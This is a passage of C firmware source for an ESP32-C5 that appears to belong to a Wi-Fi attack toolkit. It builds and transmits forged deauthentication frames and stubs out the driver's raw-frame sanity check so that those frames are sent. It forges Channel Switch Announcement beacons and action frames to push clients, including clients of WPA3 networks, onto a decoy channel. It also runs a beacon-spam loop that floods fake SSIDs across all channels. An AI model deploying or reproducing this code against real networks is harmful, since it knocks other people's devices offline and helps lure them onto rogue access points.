brokali/projectZeroTouch/ESP32C5/main/main.c
// Calculate dynamic scan timeout based on channel times
// 14 channels (2.4 GHz) + 5 second buffer for overhead
static int get_scan_timeout_iterations(void) {
    int max_scan_duration_ms = (14 * g_scan_max_channel_time) + 15000;  // 15s buffer for scan overhead
    return max_scan_duration_ms / 100; // 100ms per iteration
}

/**
 * @brief Deauthentication frame template
 */
uint8_t deauth_frame_default[] = {
    0xC0, 0x00,                         // Type/Subtype: Deauthentication (0xC0)
    0x00, 0x00,                         // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Broadcast MAC
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Sender (BSSID AP)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID AP
    0x00, 0x00,                         // Seq Control
    0x01, 0x00                          // Reason: Unspecified (0x0001)
};

int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    return 0;
}

void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size) {
    ESP_LOG_BUFFER_HEXDUMP(TAG, frame_buffer, size, ESP_LOG_DEBUG);

    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, frame_buffer, size, false);
    if (err == ESP_ERR_NO_MEM) {
        // Wi-Fi driver TX queue full (common under APSTA+NAPT+deauth), not app heap OOM.
        static int64_t last_nomem_log_us = 0;
        int64_t now_us = esp_timer_get_time();
        vTaskDelay(pdMS_TO_TICKS(rogue_gitm_mode_active || capture_gateway_is_active() ? 80 : 20));
        if (now_us - last_nomem_log_us > 2000000) {
            last_nomem_log_us = now_us;
            MY_LOG_INFO(TAG, "esp_wifi_80211_tx returned ESP_ERR_NO_MEM (internal free=%d)",
                        heap_caps_get_free_size(MALLOC_CAP_INTERNAL));
        }
        return;
    }
}

/**
 * Build a beacon frame with specified SSID
 * Returns the size of the beacon frame
 */
static int build_beacon_frame(uint8_t *frame_buffer, size_t buffer_size, const char *ssid, const uint8_t *bssid, uint8_t channel) {
    if (!frame_buffer || !ssid || !bssid || buffer_size < 200) {
        return 0;
    }

    int ssid_len = strlen(ssid);
    if (ssid_len > 32) {
        ssid_len = 32;
    }

    int pos = 0;

    // Frame Control: Type=Management(0), Subtype=Beacon(8) = 0x80
    frame_buffer[pos++] = 0x80;
    frame_buffer[pos++] = 0x00;

    // Duration
    frame_buffer[pos++] = 0x00;
    frame_buffer[pos++] = 0x00;

    // Destination Address (broadcast)
    memset(&frame_buffer[pos], 0xFF, 6);
    pos += 6;

    // Source Address (BSSID)
    memcpy(&frame_buffer[pos], bssid, 6);
    pos += 6;

    // BSSID
    memcpy(&frame_buffer[pos], bssid, 6);
    pos += 6;

    // Sequence Control
    frame_buffer[pos++] = 0x00;
    frame_buffer[pos++] = 0x00;

    // Beacon Frame Body
    // Timestamp (8 bytes)
    uint64_t timestamp = esp_timer_get_time();
    memcpy(&frame_buffer[pos], &timestamp, 8);
    pos += 8;

    // Beacon Interval (100 TU = 102.4 ms)
    frame_buffer[pos++] = 0x64;
    frame_buffer[pos++] = 0x00;

    // Capability Info (ESS, no privacy)
    frame_buffer[pos++] = 0x01;
    frame_buffer[pos++] = 0x00;

    // Tagged parameters
    // SSID parameter set
    frame_buffer[pos++] = 0x00; // Tag: SSID
    frame_buffer[pos++] = ssid_len; // Length
    memcpy(&frame_buffer[pos], ssid, ssid_len);
    pos += ssid_len;

    // Supported Rates
    frame_buffer[pos++] = 0x01; // Tag: Supported Rates
    frame_buffer[pos++] = 0x08; // Length
    frame_buffer[pos++] = 0x82; // 1 Mbps (basic)
    frame_buffer[pos++] = 0x84; // 2 Mbps (basic)
    frame_buffer[pos++] = 0x8B; // 5.5 Mbps (basic)
    frame_buffer[pos++] = 0x96; // 11 Mbps (basic)
    frame_buffer[pos++] = 0x24; // 18 Mbps
    frame_buffer[pos++] = 0x30; // 24 Mbps
    frame_buffer[pos++] = 0x48; // 36 Mbps
    frame_buffer[pos++] = 0x6C; // 54 Mbps

    // DS Parameter Set (channel)
    frame_buffer[pos++] = 0x03; // Tag: DS Parameter
    frame_buffer[pos++] = 0x01; // Length
    frame_buffer[pos++] = channel; // Channel from parameter

    return pos;
}

static bool authmode_needs_csa(wifi_auth_mode_t mode)
{
    return mode == WIFI_AUTH_WPA3_PSK
        || mode == WIFI_AUTH_WPA2_WPA3_PSK
        || mode == WIFI_AUTH_OWE;
}

static bool authmode_needs_deauth(wifi_auth_mode_t mode)
{
    return mode != WIFI_AUTH_WPA3_PSK && mode != WIFI_AUTH_OWE;
}

static uint8_t csa_operating_class(uint8_t channel)
{
    if (channel >= 1 && channel <= 13) {
        return 81;
    }
    if (channel == 14) {
        return 82;
    }
    if (channel >= 36 && channel <= 48) {
        return 115;
    }
    if (channel >= 52 && channel <= 64) {
        return 118;
    }
    if (channel >= 100 && channel <= 144) {
        return 121;
    }
    if (channel >= 149 && channel <= 177) {
        return 125;
    }
    return (channel <= 14) ? 81 : 115;
}

static uint8_t csa_decoy_channel(uint8_t ap_channel)
{
    if (ap_channel > 14) {
        return (ap_channel == 36) ? 40 : 36;
    }
    return (ap_channel == 1) ? 6 : 1;
}

static int build_csa_beacon_frame(uint8_t *frame_buffer, size_t buffer_size,
                                  const char *ssid, const uint8_t *bssid,
                                  uint8_t ap_channel, uint8_t decoy_channel)
{
    int pos = build_beacon_frame(frame_buffer, buffer_size, ssid, bssid, ap_channel);
    if (pos <= 0) {
        return 0;
    }
    if ((size_t)pos + 14 > buffer_size) {
        return 0;
    }

    uint8_t op_class = csa_operating_class(decoy_channel);
    frame_buffer[pos++] = 0x25; // CSA IE
    frame_buffer[pos++] = 0x03;
    frame_buffer[pos++] = 0x01;
    frame_buffer[pos++] = decoy_channel;
    frame_buffer[pos++] = 0x00;
    frame_buffer[pos++] = 0x3C; // ECSA IE
    frame_buffer[pos++] = 0x04;
    frame_buffer[pos++] = 0x01;
    frame_buffer[pos++] = op_class;
    frame_buffer[pos++] = decoy_channel;
    frame_buffer[pos++] = 0x00;
    frame_buffer[pos++] = 0x3E; // Secondary Channel Offset SCN
    frame_buffer[pos++] = 0x01;
    frame_buffer[pos++] = 0x00;
    return pos;
}

static int build_csa_action_frame(uint8_t *frame_buffer, size_t buffer_size,
                                  const uint8_t *dest, const uint8_t *bssid,
                                  uint8_t decoy_channel)
{
    if (!frame_buffer || !dest || !bssid || buffer_size < 31) {
        return 0;
    }

    int pos = 0;
    frame_buffer[pos++] = 0xD0; // Action
    frame_buffer[pos++] = 0x00;
    frame_buffer[pos++] = 0x00;
    frame_buffer[pos++] = 0x00;
    memcpy(&frame_buffer[pos], dest, 6);
    pos += 6;
    memcpy(&frame_buffer[pos], bssid, 6);
    pos += 6;
    memcpy(&frame_buffer[pos], bssid, 6);
    pos += 6;
    frame_buffer[pos++] = 0x00;
    frame_buffer[pos++] = 0x00;
    frame_buffer[pos++] = 0x00; // Category: Spectrum Management
    frame_buffer[pos++] = 0x04; // Action: Channel Switch Announcement
    frame_buffer[pos++] = 0x25;
    frame_buffer[pos++] = 0x03;
    frame_buffer[pos++] = 0x01;
    frame_buffer[pos++] = decoy_channel;
    frame_buffer[pos++] = 0x00;
    return pos;
}

/**
 * Send a beacon frame
 */
static void send_beacon_frame(const uint8_t *frame_buffer, int size) {
    if (!frame_buffer || size <= 0) {
        return;
    }

    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
    if (err == ESP_ERR_NO_MEM) {
        vTaskDelay(pdMS_TO_TICKS(20));
        return;
    }
}

static esp_err_t wifi_apply_extended_country(void);
static void wifi_get_24ghz_channel_bounds(uint8_t *first_channel, uint8_t *last_channel);

/**
 * Beacon spam task - continuously sends beacon frames for configured SSIDs
 * Sends on all allowed 2.4 GHz channels with channel hopping
 */
static void beacon_spam_task(void *pvParameters) {
    (void)pvParameters;

    uint8_t first_channel = 1;
    uint8_t last_channel = 11;
    wifi_get_24ghz_channel_bounds(&first_channel, &last_channel);

    MY_LOG_INFO(TAG, "Beacon spam task started with %d SSIDs on channels %u-%u",
               beacon_ssid_count, first_channel, last_channel);
    
    // Static BSSID for all fake APs
    const uint8_t bssid[6] = {0x02, 0x00, 0x00, 0x00, 0x00, 0x01};
    
    // Frame buffer
    uint8_t frame_buffer[256];
    
    while (beacon_spam_active && !operation_stop_requested) {
        // Iterate through all channels
        for (uint8_t current_channel = first_channel;
             current_channel <= last_channel && beacon_spam_active && !operation_stop_requested;
             current_channel++) {
            // Set WiFi channel
            esp_err_t err = esp_wifi_set_channel(current_channel, WIFI_SECOND_CHAN_NONE);
            if (err != ESP_OK) {
                MY_LOG_INFO(TAG, "Failed to set channel %d: %s", current_channel, esp_err_to_name(err));
            }
            
            // Small delay to allow channel switch
            vTaskDelay(pdMS_TO_TICKS(10));
            
            // Send beacons for all SSIDs on this channel
            for (int i = 0; i < beacon_ssid_count && beacon_spam_active && !operation_stop_requested; i++) {
                // Build beacon frame for this SSID on current channel
                int frame_size = build_beacon_frame(frame_buffer, sizeof(frame_buffer), beacon_ssids[i], bssid, current_channel);
                
                if (frame_size > 0) {
                    // Send the beacon frame
                    send_beacon_frame(frame_buffer, frame_size);
                }
                
                {
                    static int64_t bcn_oled_last_us = 0;
                    int64_t bcn_now_us = esp_timer_get_time();
                    if (bcn_now_us - bcn_oled_last_us > 400000) {
                        bcn_oled_last_us = bcn_now_us;
                        char bcn_l2[64], bcn_l3[64], bcn_l4[64];
                        snprintf(bcn_l2, sizeof(bcn_l2), ">> %s", beacon_ssids[i]);
                        snprintf(bcn_l3, sizeof(bcn_l3), "  Ch %d/%d", current_channel, last_channel);
                        snprintf(bcn_l4, sizeof(bcn_l4), "  %d SSIDs TX", beacon_ssid_count);
                        oled_display_update_full("> Beacon Spam", bcn_l2, bcn_l3, bcn_l4);
                    }
                }
                
                // Fast delay between beacons (10ms for faster transmission)
                vTaskDelay(pdMS_TO_TICKS(10));
            }
        }
    }
    
    MY_LOG_INFO(TAG, "Beacon spam task stopped");
    beacon_spam_active = false;
    beacon_spam_task_handle = NULL;
    vTaskDelete(NULL);
}


